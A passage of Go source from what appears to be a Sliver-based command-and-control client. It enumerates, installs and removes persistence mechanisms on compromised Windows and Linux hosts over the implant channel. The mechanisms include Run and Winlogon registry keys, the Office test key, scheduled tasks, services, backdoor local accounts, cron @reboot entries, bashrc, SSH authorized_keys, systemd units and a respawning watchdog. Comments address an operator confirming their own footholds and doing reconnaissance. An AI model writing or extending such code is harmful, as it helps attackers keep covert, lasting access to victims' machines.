	case "win-local-account":
		return "SAM\\" + name
	case "win-logon-script":
		return `HKCU\Environment\` + logonScriptValue
	case "win-office-test":
		return `HKCU\...\Office test\Special\Perf\` + name
	case "win-winlogon-userinit":
		return `HKLM\...\Winlogon\Userinit`
	case "win-schtask-boot":
		return "Task Scheduler\\" + name + " (onstart)"
	case "win-watchdog":
		return "Task Scheduler\\" + name + " (every " + strconv.Itoa(watchdogMinutes) + "m)"
	case "linux-ssh-authorized-keys":
		return "~/.ssh/authorized_keys"
	}
	return module
}

// watchdogDir is where the Linux supervisor loop keeps its script. It is under
// the user's own cache directory so no root is needed, and keyed by the artifact
// name so two watchdogs on one host cannot overwrite each other's loop.
func watchdogDir(name string) string {
	return "$HOME/.cache/" + name
}

// PersistenceList inspects every module for the platform and reports what the
// target actually has. A missing artifact is a negative result, not a Go error:
// reg query and schtasks /query exit non-zero when the value is simply absent.
//
// name is optional and only affects name-scoped modules. Supplying it lets a
// scheduled task, service or local account be answered for real; leaving it
// empty marks those rows unknown instead of reporting a host as clean.
//
// The name is validated by the same requireName path every install goes
// through, so an unvalidated query parameter can never reach a command line.
func (c *Client) PersistenceList(sessionID, platform, name string) (*PersistenceList, error) {
	if platform != platformWindows && platform != platformLinux {
		return nil, fmt.Errorf("unknown platform %q", platform)
	}
	if name != "" {
		if err := validateName(name); err != nil {
			return nil, err
		}
	}

	// The same name is asked of every module. Name-scoped ones use it; the rest
	// ignore it, so one inventory pass answers for a specific artifact and still
	// reports the anonymous state of everything else.
	//
	// The probes run concurrently. Each one is a separate round trip over the
	// implant's C2 channel, and Sliver dispatches every envelope on the target in
	// its own goroutine with the response keyed by request ID, so N probes finish
	// in roughly the time of the slowest rather than the sum of all N. Serially,
	// fifteen modules meant fifteen channel round trips and the tab sat empty for
	// seconds. The order of results is fixed by moduleCatalog regardless of the
	// order the probes complete in, so the UI stays stable.
	type probe struct {
		module     string
		label      string
		nameScoped bool
		installed  bool
		detail     string
	}

	probes := make([]probe, 0, len(moduleCatalog))
	for _, m := range moduleCatalog {
		if !supportsPlatform(m, platform) {
			continue
		}
		if _, err := inspectCommand(platform, m.ID, name); err != nil {
			continue
		}
		probes = append(probes, probe{
			module:     m.ID,
			label:      m.Name,
			nameScoped: nameModules[m.ID],
		})
	}

	var wg sync.WaitGroup
	for i := range probes {
		wg.Add(1)
		go func(p *probe) {
			defer wg.Done()
			argv, err := inspectCommand(platform, p.module, name)
			if err != nil {
				return
			}
			stdout, stderr, status := c.runPersistenceCommand(sessionID, platform, argv)
			p.installed, p.detail = detectPersistence(p.module, stdout, stderr, status, name)
		}(&probes[i])
	}
	wg.Wait()

	list := &PersistenceList{Platform: platform, Items: []PersistenceItem{}}
	for _, p := range probes {
		// A name-scoped module cannot be answered without a name. Saying so is
		// the difference between "the host is clean" and "I could not check",
		// and only one of those is true here. When the caller supplies a name the
		// question has been asked, so a negative answer is a real answer.
		unknown := p.nameScoped && name == "" && !p.installed
		detail := p.detail
		if unknown && detail == "" {
			detail = "needs an artifact name to check"
		}

		list.Items = append(list.Items, PersistenceItem{
			Module:    p.module,
			Name:      p.label,
			Location:  locationFor(p.module, name),
			Installed: p.installed,
			Detail:    detail,
			Unknown:   unknown,
			// A row can only be acted on when the inventory knows which artifact it
			// describes. Name-scoped modules are removable only once a name has
			// been supplied, because otherwise the removal would be rejected for
			// being incomplete and the button would do nothing.
			Removable: p.installed && (!p.nameScoped || name != ""),
		})
	}
	return list, nil
}

// PersistenceInstall applies module to the target. A target-level failure is
// reported inside the result, so only catalog errors surface as Go errors.
func (c *Client) PersistenceInstall(sessionID, platform, module, payload, name string) (*PersistenceResult, error) {
	argv, err := installCommand(platform, module, payload, name)
	if err != nil {
		return nil, err
	}
	stdout, stderr, status := c.runPersistenceCommand(sessionID, platform, argv)
	ok, msg := persistenceOutcome(stdout, stderr, status)
	return &PersistenceResult{OK: ok, Message: msg, Module: module, Location: locationFor(module, name)}, nil
}

// PersistenceRemove deletes module from the target.
func (c *Client) PersistenceRemove(sessionID, platform, module, name string) (*PersistenceResult, error) {
	argv, err := removeCommand(platform, module, "", name)
	if err != nil {
		return nil, err
	}
	stdout, stderr, status := c.runPersistenceCommand(sessionID, platform, argv)
	ok, msg := persistenceOutcome(stdout, stderr, status)
	return &PersistenceResult{OK: ok, Message: msg, Module: module, Location: locationFor(module, name)}, nil
}

// runPersistenceCommand flattens the exec outcome into target-facing strings: the
// HTTP layer surfaces these verbatim, so a transport error has to survive as text.
//
// On Windows the script is prefixed with `chcp 65001`, which switches that
// cmd.exe instance to UTF-8. reg, sc and schtasks print their messages in the
// OEM code page -- 936 on a Chinese install, 850 on a Western one -- so without
// this every success and failure message arrives as bytes that are not valid
// UTF-8 and reaches the operator as mojibake ("操作成功完成。" renders as
// "���������"). Decoding afterwards would mean guessing the target's code page
// from the bytes; asking for UTF-8 is exact and needs no guess.
//
// platform is passed through to the spawn so it does not have to be resolved
// from the session list. Every caller already knows it -- it selected the
// command family -- and a probe that stopped to look it up would add a round
// trip to each of the fifteen the inventory already makes.
func (c *Client) runPersistenceCommand(sessionID, platform string, argv []string) (stdout, stderr string, status uint32) {
	if len(argv) < 3 {
		return "", "internal error: incomplete command", 1
	}

	path := argv[0]
	args := argv[1:]
	if strings.EqualFold(filepathBase(path), "cmd.exe") {
		// chcp is prepended as its own tokens, not spliced into the first one.
		// shellArgv hands cmd.exe a token list (see splitWindowsCommand), so
		// args[1] is the command name -- gluing "chcp ... & " onto it would
		// produce a single token "chcp 65001 >nul & reg" and cmd would look for
		// a program by that name. The redirection stays attached to >nul.
		args = append([]string{args[0], "chcp", "65001", ">nul", "&"}, args[1:]...)
	}

	res, err := c.execOn(sessionID, platform, path, args, persistenceProbeTimeout)
	if err != nil {
		return "", err.Error(), 1
	}
	return res.Stdout, res.Stderr, res.Status
}

// filepathBase is path.Base for the Windows-agnostic case: the argv[0] here is
// always a bare program name, so it only has to tolerate a trailing separator.
func filepathBase(p string) string {
	p = strings.TrimRight(p, `\/`)
	if i := strings.LastIndexAny(p, `\/`); i >= 0 {
		return p[i+1:]
	}
	return p
}

// persistenceOutcome maps a shell result to the JSON result the UI toasts.
func persistenceOutcome(stdout, stderr string, status uint32) (bool, string) {
	msg := firstNonEmptyLine(stderr)
	if msg == "" {
		msg = firstNonEmptyLine(stdout)
	}
	switch {
	case status != 0 && msg == "":
		return false, fmt.Sprintf("command failed with status %d", status)
	case status != 0:
		return false, msg
	case msg == "":
		return true, "ok"
	}
	return true, msg
}

func supportsPlatform(m PersistenceModule, platform string) bool {
	for _, p := range m.Platforms {
		if p == platform {
			return true
		}
	}
	return false
}

// repetitiveInterval pulls the repeat interval out of a task definition, so the
// keep-alive row can report what was scheduled rather than only that something
// was.
var repetitiveInterval = regexp.MustCompile(`<Interval>(PT[^<]*)</Interval>`)

// detectSchtaskTrigger answers for the task-based Windows modules. They all name
// their task from the same operator field, so the task's mere existence cannot
// say which module installed it -- a keep-alive task would satisfy the boot-task
// row and the operator would believe in a SYSTEM persistence point that is not
// there. The trigger is what distinguishes them.
//
// The check reads the XML form of the task. The verbose list is localized prose
// and its labels differ per Windows language; the XML is a fixed schema.
func detectSchtaskTrigger(out, stderr, trigger string) (bool, string) {
	if strings.Contains(strings.ToLower(stderr), "cannot find") {
		return false, ""
	}
	if !strings.Contains(out, "<"+trigger) {
		// The task exists but was created by a different module, or by something
		// else on the host entirely.
		return false, ""
	}
	return true, "trigger: " + strings.TrimSuffix(trigger, "Trigger")
}

// detectPersistence decides presence from shell output and returns the matching
// line for display. A non-zero status is a negative answer.
func detectPersistence(module, stdout, stderr string, status uint32, name string) (bool, string) {
	if status != 0 {
		return false, ""
	}
	out := strings.TrimSpace(stdout)

	switch module {
	case "win-run-key", "win-run-key-hklm":
		// reg query prints "<name>    REG_SZ    <data>"; the echoed key path can
		// itself contain the value name, so require the value-type token too.
		//
		// Without a name the command enumerates every value, and an enumerated
		// value is not evidence of OUR persistence: a stock Windows desktop
		// already carries a dozen autostart entries (Steam, Chrome, OneDrive,
		// the vendor's own updaters). Reporting those as installed would tell the
		// operator the host is already beaconing back when it is not, which is
		// worse than saying nothing. The count is surfaced as detail so the
		// enumeration is still useful reconnaissance.
		var seen int
		for _, line := range splitLines(out) {
			if !strings.Contains(line, "REG_") {
				continue
			}
			if name == "" {
				seen++
				continue
			}
			if strings.Contains(line, name) {
				return true, capDetail(line)
			}
		}
		if name == "" && seen > 0 {
			return false, fmt.Sprintf("%d autostart value(s) present; none attributable without a name", seen)
		}
		return false, ""
	case "win-startup-folder":
		for _, line := range splitLines(out) {
			if name != "" {
				if strings.Contains(line, name+".exe") {
					return true, capDetail(line)
				}
				continue
			}
			if isExecutableArtifact(line) {
				return true, capDetail(line)
			}
		}
		return false, ""
	case "win-schtask-boot":
		// A boot task must be the boot trigger. The presence of a task with this
		// name is not enough: all three task modules name their task from the
		// same operator field, so a keep-alive task installed under one row would
		// otherwise report as installed under this one too.
		if name == "" {
			return false, ""
		}
		return detectSchtaskTrigger(out, stderr, "BootTrigger")
	case "win-watchdog":
		// The keep-alive task is a repeating time trigger. The repetition
		// interval is what was asked for, so it is reported back.
		if name == "" {
			return false, ""
		}
		installed, detail := detectSchtaskTrigger(out, stderr, "TimeTrigger")
		if !installed {
			return false, ""
		}
		if m := repetitiveInterval.FindStringSubmatch(out); m != nil {
			return true, "repeat " + m[1]
		}
		return true, detail
	case "win-schtask":
		// The logon task is a fresh logon trigger with no repetition.
		if name == "" {
			return false, ""
		}
		return detectSchtaskTrigger(out, stderr, "LogonTrigger")
	case "win-service":
		// Name-scoped: the inventory call has no name to query, so it reports
		// unknown rather than guessing from unrelated services.
		if name == "" {
			return false, ""
		}
		if strings.Contains(strings.ToLower(stderr), "cannot find") {
			return false, ""
		}
		if line := matchLine(out, name); line != "" {
			return true, capDetail(line)
		}
		if line := firstNonEmptyLine(out); line != "" {
			return true, capDetail(line)
		}
		return false, ""
	case "win-local-account":
		// `net user <name>` prints the account record when it exists and exits
		// non-zero when it does not, so a name match in the output is the
		// answer. Only the matched line is kept, since a full record would fill
		// the detail column with unrelated fields.
		if name == "" {
			return false, ""
		}
		if line := matchLine(out, name); line != "" {
			return true, capDetail(line)
		}
		return false, ""
	case "win-logon-script":
		// The value name is fixed, so the row is answered without a name. reg
		// query prints "<name>    REG_SZ    <data>"; the data is what matters,
		// and a value whose data is empty is not persistence.
		for _, line := range splitLines(out) {
			if !strings.Contains(line, "REG_") {
				continue
			}
			return true, capDetail(line)
		}
		return false, ""
	case "win-office-test":
		// Same shape as the Run keys: the key may hold unrelated values, so an
		// enumerated value is not evidence of OUR artifact unless a name matched.
		if name == "" {
			if seen := countRegistryValues(out); seen > 0 {
				return false, fmt.Sprintf("%d Office test value(s) present; none attributable without a name", seen)
			}
			return false, ""
		}
		if line := matchLine(out, name); line != "" {
			return true, capDetail(line)
		}
		return false, ""
	case "win-winlogon-userinit":
		// Userinit is a comma-separated list, so the payload is an entry inside a
		// value rather than a value of its own. The stock value is
		// "C:\Windows\system32\userinit.exe," -- it already ends with a
		// separator -- so counting separators would report every stock host as
		// compromised. Entries are counted instead, and the row is only installed
		// when there is more than the single stock entry.
		for _, line := range splitLines(out) {
			if !strings.Contains(line, "REG_") {
				continue
			}
			if n := countListEntries(registryValueData(line)); n > 1 {
				return true, fmt.Sprintf("%d entries; %s", n, capDetail(registryValueData(line)))
			}
			return false, ""
		}
		return false, ""
	case "linux-cron":
		for _, line := range splitLines(out) {
			if strings.Contains(line, "@reboot") {
				return true, capDetail(line)
			}
		}
		return false, ""
	case "linux-bashrc", "linux-ssh-authorized-keys":
		// grep -c: the count is the whole answer.
		if firstLineInt(out) <= 0 {
			return false, ""
		}
		return true, capDetail(firstNonEmptyLine(out))
	case "linux-systemd", "linux-systemd-user":
		state := firstNonEmptyLine(out)
		if state == "" || state == "disabled" || state == "not-found" {
			return false, ""
		}
		return true, capDetail(state)
	case "linux-cron-interval":
		// The inventory has no name, but the schedule is itself the marker: a
		// keep-alive rule is recognisable without knowing what artifact it runs.
		for _, line := range splitLines(out) {
			if strings.Contains(line, strings.TrimSpace(intervalSchedule)) {
				return true, capDetail(line)
			}
		}
		return false, ""
	case "linux-watchdog":
		// A detached process is the evidence, not a file on disk: a script left
		// behind by a killed loop would otherwise read as installed while nothing
		// is respawning the payload.
		if firstLineInt(out) <= 0 {
			return false, ""
		}
		return true, capDetail(firstNonEmptyLine(out))
	}
	return false, ""
}

// isExecutableArtifact recognises a Startup-folder entry worth flagging.
func isExecutableArtifact(line string) bool {
	lower := strings.ToLower(line)
	for _, ext := range []string{".exe", ".bat", ".cmd", ".com", ".lnk", ".scr", ".vbs", ".ps1", ".url"} {
		if strings.HasSuffix(lower, ext) {
			return true
		}
	}
	return false
}

func splitLines(s string) []string {
	raw := strings.Split(s, "\n")
	out := make([]string, 0, len(raw))
	for _, line := range raw {
		line = strings.TrimSpace(strings.TrimRight(line, "\r"))
		if line != "" {
			out = append(out, line)
		}
	}
	return out
}

func matchLine(out, needle string) string {
	if needle == "" {
		return ""
	}
	for _, line := range splitLines(out) {
		if strings.Contains(line, needle) {
			return line
		}
	}
	return ""
}

// countRegistryValues counts the data lines of a `reg query` listing. Only lines
// carrying a REG_ type token are counted, so the echoed key path -- which the
// command prints first and which is not a value -- is skipped.
func countRegistryValues(out string) int {
	n := 0
	for _, line := range splitLines(out) {
		if strings.Contains(line, "REG_") {
			n++
		}
	}
	return n
}

// registryValueData returns the data column of a `reg query` data line, which is
// everything after the REG_<type> token. The columns are separated by runs of
// spaces and the data itself may contain spaces, so the split is done on the
// type token rather than on whitespace.
func registryValueData(line string) string {
	i := strings.Index(line, "REG_")
	if i < 0 {
		return ""
	}
	rest := line[i:]
	// rest begins with the type token itself; the data follows the next run of
	// whitespace, or is empty when the value has no data.
	j := strings.IndexAny(rest, " \t")
	if j < 0 {
		return ""
	}
	return strings.TrimSpace(rest[j:])
}

// countListEntries counts the non-empty comma-separated entries in a registry
// list value. The separator is stripped as part of the split, which is what
// makes a stock trailing comma count as one entry rather than two.
func countListEntries(data string) int {
	n := 0
	for _, part := range strings.Split(data, ",") {
		if strings.TrimSpace(part) != "" {
			n++
		}
	}
	return n
}

func firstLine(s string) string {
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return s[:i]
	}
	return s
}

func firstNonEmptyLine(s string) string {
	for _, line := range splitLines(s) {
		return line
	}
	return ""
}

// firstLineInt parses the leading integer of a count-style command; a non-numeric
// line (an error message on stdout) reads as zero.
func firstLineInt(s string) int {
	n, err := strconv.Atoi(strings.TrimSpace(firstLine(s)))
	if err != nil {
		return 0
	}
	return n
}

// capDetail keeps inventory rows from carrying a whole command transcript.
func capDetail(s string) string {
	const maxDetail = 200
	if len(s) <= maxDetail {
		return s
	}
	return strings.TrimSpace(s[:maxDetail]) + "…"
}
